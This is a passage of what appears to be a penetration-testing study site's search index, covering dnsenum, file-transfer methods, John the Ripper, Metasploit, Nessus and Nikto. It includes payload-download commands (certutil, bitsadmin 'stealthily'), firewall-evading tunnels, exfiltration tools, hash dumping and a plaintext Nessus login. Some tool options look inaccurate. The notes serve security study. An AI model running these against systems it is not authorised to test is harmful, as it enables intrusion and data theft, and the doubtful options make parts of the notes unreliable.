only MX records (Mail Exchange). You can replace <code>mx</code> with <code>a</code>, <code>ns</code>, <code>txt</code>, etc., for specific record types.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/#6-subdomain-enumeration-with-whois-integration","title":"6. Subdomain Enumeration with WHOIS Integration","text":"<ul> <li>Objective: Attempt subdomain enumeration with WHOIS integration to discover additional subdomains and associated information.</li> <li> <p>Command:</p> <p><code>dnsenum --whois -v &lt;domain&gt;</code></p> <ul> <li>Details: This will attempt subdomain enumeration while integrating WHOIS data for better insight into the domain registration and ownership.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/#7-dns-trace-route-with-specific-nameserver","title":"7. DNS Trace Route with Specific Nameserver","text":"<ul> <li>Objective: Perform a DNS trace route from a specific nameserver to understand the full path of the DNS query.</li> <li> <p>Command:</p> <p><code>dnsenum -t -s &lt;nameserver&gt; &lt;domain&gt;</code></p> <ul> <li>Details: The <code>-t</code> option will trace the DNS query path from the nameserver you specify to the target domain.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/#8-retrieve-dns-records-for-multiple-domains","title":"8. Retrieve DNS Records for Multiple Domains","text":"<ul> <li>Objective: Perform DNS enumeration across multiple domains using a file with a list of domains.</li> <li> <p>Command:</p> <p><code>dnsenum -f /path/to/domains.txt -v</code></p> <ul> <li>Details: Enumerate DNS information for all domains listed in the <code>domains.txt</code> file. This can be useful for scanning multiple targets at once.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/#9-use-dns-cache-snooping","title":"9. Use DNS Cache Snooping","text":"<ul> <li>Objective: Check if a DNS server has cached records for a domain, revealing whether the server has looked up the domain recently.</li> <li> <p>Command:</p> <p><code>dnsenum --cache-snooping -v &lt;domain&gt;</code></p> <ul> <li>Details: This command attempts to snoop on the DNS cache of the specified server, revealing previously queried domains or records.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/#10-brute-force-with-reverse-dns-range","title":"10. Brute Force with Reverse DNS Range","text":"<ul> <li>Objective: Brute-force a range of reverse DNS entries (useful for testing entire subnets or IP ranges for PTR records).</li> <li> <p>Command:</p> <p><code>dnsenum -r -i 10.0.0.0/24 &lt;domain&gt;</code></p> <ul> <li>Details: <code>-r</code> attempts reverse DNS lookups, and <code>-i</code> brute-forces the given IP range. This is helpful for large subnets or targeting entire address spaces.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/File%20Transfer%20tools/","title":"File Transfer tools","text":""},{"location":"CPTS/Tools/File%20Transfer%20tools/#windows-built-in-tools","title":"Windows Built-in Tools","text":"<ol> <li> <p>PowerShell</p> <ul> <li>Command: <code>Invoke-WebRequest</code> or <code>Invoke-Expression</code></li> <li> <p>Example:</p> <pre><code>Invoke-WebRequest -Uri http://&lt;IP&gt;/&lt;file&gt; -OutFile &lt;file&gt;\n</code></pre> </li> <li> <p>Usage: Download files directly from HTTP/HTTPS servers.</p> </li> </ul> </li> <li> <p>certutil</p> <ul> <li>Command: <code>certutil -urlcache -split -f http://&lt;IP&gt;/&lt;file&gt; &lt;file&gt;</code></li> <li>Usage: A built-in utility that can download files over HTTP/HTTPS.</li> </ul> </li> <li> <p>bitsadmin</p> <ul> <li>Command: <code>bitsadmin /transfer myJob /download /priority high http://&lt;IP&gt;/&lt;file&gt; C:\\path\\to\\file</code></li> <li>Usage: Used to download files stealthily over HTTP/HTTPS.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/File%20Transfer%20tools/#linux-built-in-tools","title":"Linux Built-in Tools","text":"<ol> <li> <p>scp (Secure Copy Protocol)</p> <ul> <li>Command: <code>scp user@&lt;IP&gt;:&lt;remote-file&gt; &lt;local-path&gt;</code></li> <li>Usage: Transfer files securely over SSH.</li> </ul> </li> <li> <p>wget</p> <ul> <li>Command: <code>wget http://&lt;IP&gt;/&lt;file&gt;</code></li> <li>Usage: Download files directly from HTTP/HTTPS servers.</li> </ul> </li> <li> <p>curl</p> <ul> <li>Command: <code>curl -O http://&lt;IP&gt;/&lt;file&gt;</code></li> <li>Usage: Flexible tool to download files.</li> </ul> </li> <li> <p>nc (Netcat)</p> <ul> <li>Server: <code>nc -lvp &lt;port&gt; &lt; &lt;file&gt;</code></li> <li>Client: <code>nc &lt;IP&gt; &lt;port&gt; &gt; &lt;file&gt;</code></li> <li>Usage: Simple way to transfer files over raw TCP.</li> </ul> </li> <li> <p>rsync</p> <ul> <li>Command: <code>rsync -avz user@&lt;IP&gt;:&lt;file&gt; &lt;local-path&gt;</code></li> <li>Usage: Sync files efficiently between systems.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/File%20Transfer%20tools/#cross-platform-tools","title":"Cross-Platform Tools","text":"<ol> <li> <p>FTP</p> <ul> <li>Command: <code>ftp &lt;IP&gt;</code></li> <li>Usage: Upload/download files using FTP protocol.</li> </ul> </li> <li> <p>HTTP Server</p> <ul> <li> <p>Python:</p> <pre><code>python3 -m http.server &lt;port&gt;\n</code></pre> </li> <li> <p>Transfer using browser or tools like <code>wget</code>/<code>curl</code>.</p> </li> </ul> </li> <li> <p>SMB (Samba)</p> <ul> <li> <p>Using <code>smbclient</code>:</p> <pre><code>smbclient //IP/share -U user put &lt;file&gt;\n</code></pre> </li> <li> <p>Usage: Transfer files via SMB.</p> </li> </ul> </li> <li> <p>HTTP File Servers</p> <ul> <li> <p>SimpleHTTPServer (Python 2):</p> <pre><code>python -m SimpleHTTPServer &lt;port&gt;\n</code></pre> </li> <li> <p>PHP:</p> <pre><code>php -S 0.0.0.0:&lt;port&gt;\n</code></pre> </li> </ul> </li> <li> <p>TFTP (Trivial File Transfer Protocol)</p> <ul> <li>Server: <code>atftpd --daemon /path/to/files</code></li> <li>Client: <code>tftp &lt;IP&gt; -c get &lt;file&gt;</code></li> <li>Usage: Lightweight file transfer for limited environments.</li> </ul> </li> <li> <p>Impacket's smbserver.py</p> <ul> <li> <p>Command:</p> <pre><code>smbserver.py share /path/to/files\n</code></pre> </li> <li> <p>Usage: Share files over SMB without installing Samba.</p> </li> </ul> </li> <li> <p>HTTPUpload</p> <ul> <li>Command: Use tools like <code>curl</code> or <code>nc</code> to upload files directly to a listening HTTP/HTTPS server.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/File%20Transfer%20tools/#stealth-tools","title":"Stealth Tools","text":"<ol> <li> <p>DNS Tunneling</p> <ul> <li>Tools: <code>dnscat2</code>, <code>iodine</code></li> <li>Usage: Transfer files using DNS queries to evade firewalls.</li> </ul> </li> <li> <p>ICMP Tunneling</p> <ul> <li>Tools: <code>ptunnel</code>, <code>icmptx</code></li> <li>Usage: Send data using ICMP echo requests (ping).</li> </ul> </li> <li> <p>Powershell Transfer with Base64 Encoding</p> <ul> <li> <p>Encode file in Base64:</p> <pre><code>$content = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"&lt;file&gt;\"))\n</code></pre> </li> <li> <p>Decode and save on target.</p> </li> </ul> </li> <li> <p>WebDAV (via Kali)</p> <ul> <li> <p>Command:</p> <pre><code>davtest -url http://&lt;IP&gt;\n</code></pre> </li> <li> <p>Usage: Upload files via WebDAV to a writable directory.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/File%20Transfer%20tools/#third-party-tools","title":"Third-Party Tools","text":"<ol> <li> <p>Exfiltration Tools</p> <ul> <li>Empire: Offers modules to exfiltrate files during engagements.</li> <li>Metasploit Upload/Download: Use sessions to upload/download files.</li> </ul> </li> <li> <p>Magic-Wormhole</p> <ul> <li>Command: <code>wormhole send &lt;file&gt;</code></li> <li>Usage: Send files securely via a short code.</li> </ul> </li> <li> <p>Croc</p> <ul> <li>Command: <code>croc send &lt;file&gt;</code></li> <li>Usage: Secure and easy file sharing.</li> </ul> </li> <li> <p>Rclone</p> <ul> <li>Command: Sync with cloud providers like Google Drive or S3.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/File%20Transfer%20tools/#cloud-based-transfers","title":"Cloud-Based Transfers","text":"<ol> <li> <p>Dropbox/GDrive Upload Scripts</p> <ul> <li>Use APIs or CLI tools to upload files to cloud storage.</li> </ul> </li> <li> <p>Pastebin/Gist</p> <ul> <li>Upload file contents and share via link.</li> </ul> </li> </ol> <p>These tools and methods are staples in penetration testing engagements, allowing flexibility depending on the environment and constraints.</p>"},{"location":"CPTS/Tools/JtR/","title":"John the Ripper (JtR) Comprehensive Guide","text":""},{"location":"CPTS/Tools/JtR/#table-of-contents","title":"Table of Contents","text":"<ol> <li> <p>Introduction to John the Ripper</p> </li> <li> <p>Basic Usage</p> </li> <li> <p>Working with Wordlists</p> </li> <li> <p>Cracking Password Hashes</p> </li> <li> <p>Advanced Techniques</p> </li> <li> <p>Cracking Encrypted PDFs</p> </li> <li> <p>Custom Rules</p> </li> <li> <p>Tips and Optimization</p> </li> <li> <p>References</p> </li> </ol>"},{"location":"CPTS/Tools/JtR/#1-introduction-to-john-the-ripper","title":"1. Introduction to John the Ripper","text":"<p>John the Ripper (JtR) is a versatile and powerful password-cracking tool used by penetration testers and security professionals. It supports numerous hash types and offers extensive customization options.</p>"},{"location":"CPTS/Tools/JtR/#installation","title":"Installation","text":"<ol> <li> <p>On Linux-based systems:</p> <pre><code>sudo apt update\nsudo apt install john\n</code></pre> </li> <li> <p>Clone the Jumbo version (recommended for additional features):</p> <pre><code>git clone https://github.com/openwall/john.git\ncd john/src\n./configure &amp;&amp; make\n</code></pre> </li> <li> <p>Verify the installation:</p> <pre><code>john --version\n</code></pre> </li> </ol>"},{"location":"CPTS/Tools/JtR/#2-basic-usage","title":"2. Basic Usage","text":""},{"location":"CPTS/Tools/JtR/#syntax","title":"Syntax","text":"<pre><code>john [options] &lt;file&gt;\n</code></pre>"},{"location":"CPTS/Tools/JtR/#example-cracking-a-basic-hash-file","title":"Example: Cracking a Basic Hash File","text":"<ol> <li> <p>Create a hash file (e.g., <code>hashes.txt</code>):</p> <pre><code>admin:$6$randomhashvalue\n</code></pre> </li> <li> <p>Run JtR:</p> <pre><code>john hashes.txt\n</code></pre> </li> <li> <p>View results:</p> <pre><code>john --show hashes.txt\n</code></pre> </li> </ol>"},{"location":"CPTS/Tools/JtR/#3-working-with-wordlists","title":"3. Working with Wordlists","text":""},{"location":"CPTS/Tools/JtR/#using-a-wordlist","title":"Using a Wordlist","text":"<pre><code>john --wordlist=&lt;path_to_wordlist&gt; &lt;file&gt;\n</code></pre>"},{"location":"CPTS/Tools/JtR/#example","title":"Example:","text":"<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#generating-wordlists-with-rules","title":"Generating Wordlists with <code>--rules</code>","text":"<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#4-cracking-password-hashes","title":"4. Cracking Password Hashes","text":""},{"location":"CPTS/Tools/JtR/#supported-hash-types","title":"Supported Hash Types","text":"<p>List all supported formats:</p> <pre><code>john --list=formats\n</code></pre>"},{"location":"CPTS/Tools/JtR/#specify-a-format","title":"Specify a Format","text":"<pre><code>john --format=&lt;format&gt; hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#example-cracking-md5-hashes","title":"Example: Cracking MD5 Hashes","text":"<pre><code>john --format=raw-md5 hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#5-advanced-techniques","title":"5. Advanced Techniques","text":""},{"location":"CPTS/Tools/JtR/#incremental-mode","title":"Incremental Mode","text":"<p>Incremental mode uses brute force to generate possible passwords:</p> <pre><code>john --incremental hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#external-mode","title":"External Mode","text":"<p>Leverage custom cracking logic:</p> <pre><code>john --external=&lt;mode&gt; hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#6-cracking-encrypted-pdfs","title":"6. Cracking Encrypted PDFs","text":""},{"location":"CPTS/Tools/JtR/#extract-hash-from-a-pdf","title":"Extract Hash from a PDF","text":"<p>Use the <code>pdf2john</code> utility (bundled with JtR):</p> <pre><code>python3 pdf2john.py &lt;file.pdf&gt; &gt; pdf_hash.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#crack-the-pdf-password","title":"Crack the PDF Password","text":"<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#show-results","title":"Show Results","text":"<pre><code>john --show pdf_hash.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#7-custom-rules","title":"7. Custom Rules","text":""},{"location":"CPTS/Tools/JtR/#adding-custom-rules-in-johnconf","title":"Adding Custom Rules in <code>john.conf</code>","text":"<ol> <li> <p>Open the configuration file:</p> <pre><code>nano ~/.john/john.conf\n</code></pre> </li> <li> <p>Add a rule under the <code>[List.Rules:Wordlist]</code> section:</p> <pre><code>Az\"s[0-9]\"\n</code></pre> </li> <li> <p>Apply the rule during cracking:</p> <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt\n</code></pre> </li> </ol>"},{"location":"CPTS/Tools/JtR/#8-tips-and-optimization","title":"8. Tips and Optimization","text":""},{"location":"CPTS/Tools/JtR/#restore-a-cracking-session","title":"Restore a Cracking Session","text":"<p>If a session is interrupted, restore it with:</p> <pre><code>john --restore\n</code></pre>"},{"location":"CPTS/Tools/JtR/#save-a-session","title":"Save a Session","text":"<p>Save progress in a named session:</p> <pre><code>john --session=my_session hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#parallel-processing","title":"Parallel Processing","text":"<p>Use OpenMP to utilize multiple CPU cores:</p> <pre><code>john --fork=&lt;num_of_cores&gt; hashes.txt\n</code></pre>"},{"location":"CPTS/Tools/JtR/#9-references","title":"9. References","text":"<ul> <li> <p>John the Ripper Documentation</p> </li> <li> <p>RockYou Wordlist</p> </li> </ul>"},{"location":"CPTS/Tools/Metasploit/","title":"Metasploit","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/Metasploit/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Tools/Metasploit/#metasploit-framework-overview","title":"Metasploit Framework Overview","text":"<p>Metasploit is a powerful open-source framework used for developing, testing, and executing exploit code against target systems. It's a popular tool among penetration testers due to its wide range of pre-built exploits, payloads, and auxiliary modules for various network and host-based attacks.</p>"},{"location":"CPTS/Tools/Metasploit/#basic-commands-in-metasploit","title":"Basic Commands in Metasploit","text":"<ol> <li> <p>Starting Metasploit</p> <ul> <li> <p>Start Metasploit Console:</p> <p>bash</p> <p>Copy code</p> <p><code>msfconsole</code></p> </li> <li> <p>Update Metasploit:</p> <p>bash</p> <p>Copy code</p> <p><code>msfupdate</code></p> </li> </ul> </li> <li> <p>Finding Modules</p> <ul> <li> <p>Search for an exploit or auxiliary module:</p> <p>bash</p> <p>Copy code</p> <p><code>search &lt;module-name&gt;</code></p> </li> <li> <p>Show detailed information about a module:</p> <p>bash</p> <p>Copy code</p> <p><code>info &lt;module-name&gt;</code></p> </li> </ul> </li> <li> <p>Using Modules</p> <ul> <li> <p>Select a module to use:</p> <p>bash</p> <p>Copy code</p> <p><code>use &lt;module-path&gt;</code></p> </li> <li> <p>Set options for the module (e.g., RHOST for the target IP):</p> <p>bash</p> <p>Copy code</p> <p><code>set &lt;option-name&gt; &lt;value&gt;</code></p> </li> <li> <p>Show current options for a module:</p> <p>bash</p> <p>Copy code</p> <p><code>show options</code></p> </li> <li> <p>Run the selected exploit or auxiliary module:</p> <p>bash</p> <p>Copy code</p> <p><code>run</code></p> <p>or</p> <p>bash</p> <p>Copy code</p> <p><code>exploit</code></p> </li> </ul> </li> <li> <p>Common Payloads</p> <ul> <li> <p>Set a payload (e.g., reverse shell):</p> <p>bash</p> <p>Copy code</p> <p><code>set PAYLOAD &lt;payload-name&gt;</code></p> </li> <li> <p>View all available payloads:</p> <p>bash</p> <p>Copy code</p> <p><code>show payloads</code></p> </li> </ul> </li> <li> <p>Managing Sessions</p> <ul> <li> <p>List active sessions:</p> <p>bash</p> <p>Copy code</p> <p><code>sessions -l</code></p> </li> <li> <p>Interact with a specific session:</p> <p>bash</p> <p>Copy code</p> <p><code>sessions -i &lt;session-id&gt;</code></p> </li> <li> <p>Background a session:</p> <p>bash</p> <p>Copy code</p> <p><code>background</code></p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Metasploit/#advanced-metasploit-commands","title":"Advanced Metasploit Commands","text":"<ol> <li> <p>Meterpreter Commands     After obtaining a Meterpreter session, the following commands provide additional control:</p> <ul> <li> <p>Get system information:</p> <p>bash</p> <p>Copy code</p> <p><code>sysinfo</code></p> </li> <li> <p>List files in a directory:</p> <p>bash</p> <p>Copy code</p> <p><code>ls</code></p> </li> <li> <p>Download a file from the target:</p> <p>bash</p> <p>Copy code</p> <p><code>download &lt;file-path&gt;</code></p> </li> <li> <p>Upload a file to the target:</p> <p>bash</p> <p>Copy code</p> <p><code>upload &lt;file-path&gt;</code></p> </li> <li> <p>Execute a shell command:</p> <p>bash</p> <p>Copy code</p> <p><code>shell</code></p> </li> <li> <p>Dump password hashes:</p> <p>bash</p> <p>Copy code</p> <p><code>hashdump</code></p> </li> </ul> </li> <li> <p>Post-Exploitation Modules     Use post-exploitation modules to gather further information or maintain access:</p> <ul> <li> <p>Use a post-exploitation module (e.g., gathering network info):</p> <p>bash</p> <p>Copy code</p> <p><code>use post/windows/gather/arp_scanner</code></p> </li> <li> <p>Set options and run:</p> <p>bash</p> <p>Copy code</p> <p><code>set SESSION &lt;session-id&gt; run</code></p> </li> </ul> </li> <li> <p>Pivoting and Routing</p> <ul> <li> <p>Add a route to pivot through a compromised host:</p> <p>bash</p> <p>Copy code</p> <p><code>route add &lt;subnet&gt; &lt;netmask&gt; &lt;session-id&gt;</code></p> </li> </ul> </li> <li> <p>Database Commands     Store results and findings in the Metasploit database for later use.</p> <ul> <li> <p>Start and connect to the database:</p> <p>bash</p> <p>Copy code</p> <p><code>db_connect &lt;user&gt;:&lt;password&gt;@localhost/metasploitdb</code></p> </li> <li> <p>Add a target to the database:</p> <p>bash</p> <p>Copy code</p> <p><code>hosts -a &lt;target-ip&gt;</code></p> </li> <li> <p>Store scan results:</p> <p>bash</p> <p>Copy code</p> <p><code>db_nmap &lt;target-ip&gt;</code></p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Metasploit/#study-and-learning-tips-for-metasploit","title":"Study and Learning Tips for Metasploit","text":"<ol> <li> <p>Practice on Virtual Labs</p> <ul> <li>Set up a safe lab environment using virtual machines to test Metasploit modules and payloads. Try platforms like Hack The Box, TryHackMe, or VulnHub for practical challenges.</li> <li> <p>Master Basic Commands First</p> </li> <li> <p>Gain confidence in finding and using basic modules before moving to advanced features. Consistent practice with <code>search</code>, <code>use</code>, <code>set</code>, <code>run</code>, and session management will build a solid foundation.</p> </li> <li> <p>Explore Payloads and Post-Exploitation</p> </li> <li> <p>Experiment with different payloads, especially reverse shells and Meterpreter payloads. Familiarize yourself with post-exploitation options for data collection and privilege escalation.</p> </li> <li> <p>Learn Nmap and Auxiliary Modules</p> </li> <li> <p>Practice running Nmap scans from within Metasploit to store results directly in the Metasploit database. Use auxiliary modules for scanning, reconnaissance, and service identification.</p> </li> <li> <p>Leverage the Documentation and Cheat Sheets</p> </li> <li> <p>Refer to official Metasploit documentation and community resources. Keep a cheat sheet of essential commands to accelerate your learning process.</p> </li> <li> <p>Join a Community</p> </li> <li> <p>Interacting with others in cybersecurity forums like Reddit, Discord, or CyberSec groups can offer insights, tips, and real-world advice on leveraging Metasploit effectively.</p> </li> <li> <p>Stay Updated with New Modules</p> </li> <li> <p>Regularly update Metasploit and read about new modules or exploits that become available. This is especially important as Metasploit is frequently updated with new capabilities.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Nessus/","title":"Nessus","text":"<p><pre><code>sudo systemctl start nessusd\n</code></pre> Username: deltacode Password: admin https://127.0.0.1:8834</p> <p>Nessus is a vulnerability scanning tool developed by Tenable. It's widely used for identifying security vulnerabilities, configuration issues, and compliance violations. Here\u2019s a complete guide from beginner to advanced usage.</p>"},{"location":"CPTS/Tools/Nessus/#1-getting-started-with-nessus","title":"1. Getting Started with Nessus","text":""},{"location":"CPTS/Tools/Nessus/#what-is-nessus","title":"What is Nessus?","text":"<p>Nessus is a tool designed for vulnerability assessment. It scans networks, systems, and applications for vulnerabilities such as:</p> <ul> <li>Misconfigurations</li> <li>Outdated software</li> <li>Unpatched systems</li> <li>Policy violations</li> </ul>"},{"location":"CPTS/Tools/Nessus/#installation","title":"Installation","text":"<ol> <li> <p>Download Nessus from the official Tenable website. Select the appropriate version for your operating system.</p> </li> <li> <p>Install Nessus using the downloaded package:</p> <ul> <li> <p>For Debian/Ubuntu:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo dpkg -i Nessus-&lt;version&gt;.deb sudo systemctl start nessusd</code></p> </li> <li> <p>For RHEL/CentOS:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo rpm -ivh Nessus-&lt;version&gt;.rpm sudo systemctl start nessusd</code></p> </li> </ul> </li> <li> <p>Access the Nessus web interface:</p> <ul> <li>Navigate to <code>https://&lt;IP&gt;:8834</code> in your browser.</li> <li>Register for a license (free or professional) and activate Nessus.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Nessus/#basic-configuration","title":"Basic Configuration","text":"<ul> <li> <p>Add a Scan:</p> <ol> <li>Log in to the Nessus web interface.</li> <li>Click New Scan.</li> <li>Choose a scan type (e.g., Basic Network Scan, Credentialed Scan).</li> <li>Provide target IPs or ranges.</li> <li>Configure scan settings (e.g., credentials, ports).</li> <li> <p>Launch a Scan:</p> </li> <li> <p>Select the created scan and click Start.</p> </li> <li> <p>View Results:</p> </li> <li> <p>After the scan completes, open the results to review vulnerabilities by severity (Critical, High, Medium, Low).</p> </li> </ol> </li> </ul>"},{"location":"CPTS/Tools/Nessus/#2-intermediate-usage","title":"2. Intermediate Usage","text":""},{"location":"CPTS/Tools/Nessus/#common-nessus-commands","title":"Common Nessus Commands","text":"<p>You can control Nessus via CLI (Nessus Command Line Interface). Here are some essential commands:</p> <ul> <li> <p>Start Nessus Service:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo systemctl start nessusd</code></p> </li> <li> <p>Check Nessus Status:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo systemctl status nessusd</code></p> </li> <li> <p>Restart Nessus:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo systemctl restart nessusd</code></p> </li> <li> <p>Update Nessus Plugins:</p> <p>bash</p> <p>Copy code</p> <p><code>/opt/nessus/bin/nessuscli update</code></p> </li> <li> <p>List Users:</p> <p>bash</p> <p>Copy code</p> <p><code>/opt/nessus/sbin/nessuscli user list</code></p> </li> <li> <p>Add a User:</p> <p>bash</p> <p>Copy code</p> <p><code>/opt/nessus/sbin/nessuscli adduser</code></p> </li> <li> <p>Delete a User:</p> <p>bash</p> <p>Copy code</p> <p><code>/opt/nessus/sbin/nessuscli rmuser &lt;username&gt;</code></p> </li> </ul>"},{"location":"CPTS/Tools/Nessus/#scan-types-and-when-to-use-them","title":"Scan Types and When to Use Them","text":"<ol> <li> <p>Basic Network Scan:</p> <ul> <li>Use for general network discovery and vulnerability assessment.</li> <li>Targets IP ranges, subnets, or individual hosts.</li> <li> <p>Credentialed Scan:</p> </li> <li> <p>Provides more in-depth results by logging into the target system.</p> </li> <li>Use credentials (SSH, SMB, etc.) to test for misconfigurations and missing patches.</li> <li> <p>Web Application Tests:</p> </li> <li> <p>Test for OWASP vulnerabilities like SQL injection and XSS.</p> </li> <li>Requires specifying web application URLs.</li> <li> <p>Compliance Scan:</p> </li> <li> <p>Use to check for policy compliance (e.g., CIS benchmarks, HIPAA, PCI DSS).</p> </li> <li>Requires configuring compliance plugins and audit files.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Nessus/#custom-policies","title":"Custom Policies","text":"<p>Create custom policies to tailor scans:</p> <ol> <li>Go to Settings &gt; Policies.</li> <li>Click New Policy.</li> <li>Configure:<ul> <li>Discovery: Define target discovery methods (e.g., ping, DNS, port scanning).</li> <li>Assessment: Select the types of vulnerabilities to test for.</li> <li>Performance: Adjust performance to reduce impact on network and systems.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Nessus/#3-advanced-nessus-usage","title":"3. Advanced Nessus Usage","text":""},{"location":"CPTS/Tools/Nessus/#tuning-scan-performance","title":"Tuning Scan Performance","text":"<ul> <li> <p>Avoid Overloading the Network:</p> <ul> <li> <p>Limit concurrent connections:</p> <p>bash</p> <p>Copy code</p> <p><code>Max Concurrent TCP Sessions: 5</code></p> </li> </ul> </li> <li> <p>Exclude IPs or Hosts: Add exclusions under Settings to avoid scanning sensitive systems.</p> </li> <li> <p>Use Custom Scanning Windows: Schedule scans during off-peak hours.</p> </li> </ul>"},{"location":"CPTS/Tools/Nessus/#analyzing-scan-results","title":"Analyzing Scan Results","text":"<ol> <li> <p>Export Results:</p> <ul> <li>Export reports in various formats: HTML, PDF, CSV.</li> <li> <p>Use the CLI to export:</p> <p>bash</p> <p>Copy code</p> <p><code>/opt/nessus/sbin/nessuscli export &lt;scan-id&gt; &lt;format&gt;</code></p> </li> </ul> </li> <li> <p>Filter Vulnerabilities:</p> <ul> <li>Filter by severity, CVSS score, or plugin family in the web interface.</li> <li> <p>Prioritize Remediation:</p> </li> <li> <p>Focus on critical and high vulnerabilities first.</p> </li> <li>Group vulnerabilities by affected software for bulk remediation.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Nessus/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"CPTS/Tools/Nessus/#1-use-api-integration","title":"1. Use API Integration","text":"<p>Nessus offers a RESTful API for automation. Example commands:</p> <ul> <li> <p>Get Scan List:</p> <p>bash</p> <p>Copy code</p> <p><code>curl -X GET -H \"X-ApiKeys: accessKey=&lt;access_key&gt;; secretKey=&lt;secret_key&gt;\" \"https://&lt;nessus-host&gt;:8834/scans\"</code></p> </li> <li> <p>Launch a Scan:</p> <p>bash</p> <p>Copy code</p> <p><code>curl -X POST -H \"X-ApiKeys: accessKey=&lt;access_key&gt;; secretKey=&lt;secret_key&gt;\" \"https://&lt;nessus-host&gt;:8834/scans/&lt;scan-id&gt;/launch\"</code></p> </li> </ul>"},{"location":"CPTS/Tools/Nessus/#2-plugin-rules","title":"2. Plugin Rules","text":"<ul> <li>Disable unnecessary plugins to reduce false positives:<ul> <li>Go to Settings &gt; Plugin Rules.</li> <li>Disable noisy or irrelevant plugins.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/Nessus/#3-policy-compliance","title":"3. Policy Compliance","text":"<ul> <li>Import audit files for compliance scans:<ul> <li>Go to Compliance &gt; Upload Audit File.</li> <li>Select the relevant framework (e.g., PCI DSS, CIS).</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/Nessus/#4-tips-and-tricks","title":"4. Tips and Tricks","text":"<ol> <li> <p>Update Plugins Regularly:</p> <ul> <li>Ensure you\u2019re scanning with the latest vulnerability database.</li> <li> <p>Run:</p> <p>bash</p> <p>Copy code</p> <p><code>/opt/nessus/bin/nessuscli update</code></p> </li> </ul> </li> <li> <p>Enable Debug Logs:</p> <ul> <li> <p>Troubleshoot issues by enabling debug logs:</p> <p>bash</p> <p>Copy code</p> <p><code>/opt/nessus/sbin/nessuscli set log-level debug</code></p> </li> </ul> </li> <li> <p>Use Credentials:</p> <ul> <li>Credentialed scans provide more accurate results.</li> <li>Configure credentials in Settings &gt; Authentication.</li> <li> <p>Exclude False Positives:</p> </li> <li> <p>Review scan results for false positives.</p> </li> <li>Add exceptions under Settings &gt; Plugin Rules.</li> <li> <p>Integrate with SIEM:</p> </li> <li> <p>Export Nessus results to SIEM tools like Splunk for correlation.</p> </li> <li> <p>Leverage Tags:</p> </li> <li> <p>Organize assets using tags for better management.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Nessus/#5-common-nessus-cli-commands","title":"5. Common Nessus CLI Commands","text":"Command Description <code>nessuscli update</code> Update Nessus plugins. <code>nessuscli adduser</code> Add a Nessus user. <code>nessuscli rmuser &lt;username&gt;</code> Remove a Nessus user. <code>nessuscli export &lt;scan-id&gt; &lt;format&gt;</code> Export scan results. <code>nessuscli set log-level debug</code> Enable debug logs. <code>nessuscli start</code> Start Nessus service. <code>nessuscli stop</code> Stop Nessus service."},{"location":"CPTS/Tools/Nessus/#6-best-practices","title":"6. Best Practices","text":"<ul> <li>Credentialed Scans: Always provide credentials for accurate results.</li> <li>Scan Regularly: Schedule scans weekly or monthly.</li> <li>Prioritize Remediation: Focus on critical vulnerabilities first.</li> <li>Integrate with Tools: Use Nessus with SIEMs or orchestration platforms.</li> <li>Use Multiple Scan Types: Combine network, credentialed, and web app scans for thorough coverage.</li> </ul>"},{"location":"CPTS/Tools/Nikto/","title":"Nikto","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/Nikto/#nikto","title":"Nikto","text":"<p>Nikto is a powerful open-source web server scanner used for identifying vulnerabilities, misconfigurations, and outdated components in web servers. Here\u2019s a structured guide from beginner to advanced usage:</p>"},{"location":"CPTS/Tools/Nikto/#1-getting-started-with-nikto","title":"1. Getting Started with Nikto","text":""},{"location":"CPTS/Tools/Nikto/#installation","title":"Installation","text":"<ul> <li>Install Nikto on Kali Linux or your preferred system:     <code>bash     sudo apt update     sudo apt install nikto</code> Alternatively, clone from GitHub for the latest version: <pre><code>git clone https://github.com/sullo/nikto.git\ncd nikto\n</code></pre></li> </ul>"},{"location":"CPTS/Tools/Nikto/#basic-command","title":"Basic 